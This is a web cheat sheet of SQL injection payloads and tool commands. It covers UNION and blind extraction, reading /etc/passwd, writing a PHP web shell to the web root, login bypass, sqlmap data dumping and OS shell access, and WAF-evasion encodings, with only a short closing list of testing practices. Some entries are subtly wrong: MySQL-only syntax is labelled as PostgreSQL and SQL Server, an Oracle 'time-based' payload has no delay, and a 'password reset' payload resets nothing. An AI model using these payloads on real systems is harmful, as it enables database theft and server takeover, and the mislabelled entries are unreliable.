---
title: "SQL Injection Command Reference"
description: "Essential SQL injection payloads, techniques, and tools for database testing"
pubDate: 2025-07-18
categories: ["commands", "web-security", "testing", "database"]
---

# SQL Injection Command Reference

Essential payloads, techniques, and tools for SQL injection testing and exploitation.

## Basic Detection

### Boolean-Based Detection
```sql
# Test for SQL injection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

# Test for blind injection
' AND 1=1--
' AND 1=2--

# Test for error-based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

### Union-Based Detection
```sql
# Find number of columns
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Test data types
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

## Information Gathering

### Database Version
```sql
# MySQL
' UNION SELECT @@version--
' UNION SELECT VERSION()--

# PostgreSQL
' UNION SELECT version()--

# SQL Server
' UNION SELECT @@VERSION--

# Oracle
' UNION SELECT banner FROM v$version--
```

### Database Name
```sql
# MySQL
' UNION SELECT database()--

# PostgreSQL
' UNION SELECT current_database()--

# SQL Server
' UNION SELECT DB_NAME()--

# Oracle
' UNION SELECT ora_database_name FROM dual--
```

### Table Enumeration
```sql
# MySQL
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

# PostgreSQL
' UNION SELECT table_name FROM information_schema.tables--

# SQL Server
' UNION SELECT table_name FROM information_schema.tables--

# Oracle
' UNION SELECT table_name FROM user_tables--
```

## Advanced Techniques

### Time-Based Blind
```sql
# MySQL
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# PostgreSQL
' AND (SELECT pg_sleep(5))--

# SQL Server
' WAITFOR DELAY '00:00:05'--

# Oracle
' AND (SELECT COUNT(*) FROM all_tables WHERE ROWNUM=1 AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END))--
```

### Error-Based Extraction
```sql
# MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# PostgreSQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--

# SQL Server
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--
```

### File Operations

#### Read Files
```sql
# MySQL
' UNION SELECT LOAD_FILE('/etc/passwd')--

# PostgreSQL
' UNION SELECT pg_read_file('/etc/passwd')--

# SQL Server
' UNION SELECT * FROM OPENROWSET(BULK 'C:\windows\system32\drivers\etc\hosts', SINGLE_BLOB)--
```

#### Write Files
```sql
# MySQL
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'--

# PostgreSQL
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'--

# SQL Server
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\inetpub\wwwroot\shell.php'--
```

## Authentication Bypass

### Login Bypass
```sql
# Basic bypass
' OR '1'='1
' OR 1=1--
admin'--

# Advanced bypass
' OR '1'='1' LIMIT 1--
' UNION SELECT 'admin','password' FROM users--
```

### Password Reset
```sql
# Reset admin password
' UNION SELECT 'admin','5f4dcc3b5aa765d61d8327deb882cf99' FROM users WHERE username='admin'--
```

## Tools Integration

### SQLMap Commands
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" --tables
sqlmap -u "http://target.com/page.php?id=1" --columns

# Data extraction
sqlmap -u "http://target.com/page.php?id=1" --dump
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Shell upload
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

### Burp Suite Integration
```bash
# Send to Intruder
1. Capture request in Burp
2. Send to Intruder
3. Mark injection point
4. Add payloads:
   - ' OR 1=1--
   - ' UNION SELECT NULL--
   - ' AND SLEEP(5)--
```

## WAF Bypass Techniques

### Encoding
```sql
# URL encoding
%27%20OR%201%3D1%2D%2D

# Hex encoding
0x27206f7220313d312d2d

# Double encoding
%2527%2520OR%25201%253D1%252D%252D
```

### Alternative Syntax
```sql
# Comment alternatives
' OR 1=1#
' OR 1=1/*

# Space alternatives
'OR(1=1)--
'OR/**/1=1--
```

### Case Manipulation
```sql
# Mixed case
' Or 1=1--
' oR 1=1--
' OR 1=1--
```

## Prevention Testing

### Input Validation
```sql
# Test filters
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--

# Test encoding
%27%20OR%201%3D1%2D%2D
0x27206f7220313d312d2d
```

### Error Handling
```sql
# Test error messages
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

## Best Practices

1. **Always test in isolated environment** first
2. **Use appropriate tools** for the target
3. **Document all findings** with screenshots
4. **Follow responsible disclosure** procedures
5. **Test for WAF bypass** techniques
6. **Verify injection points** before exploitation
7. **Use time delays** for blind injection testing
8. **Monitor response times** for detection 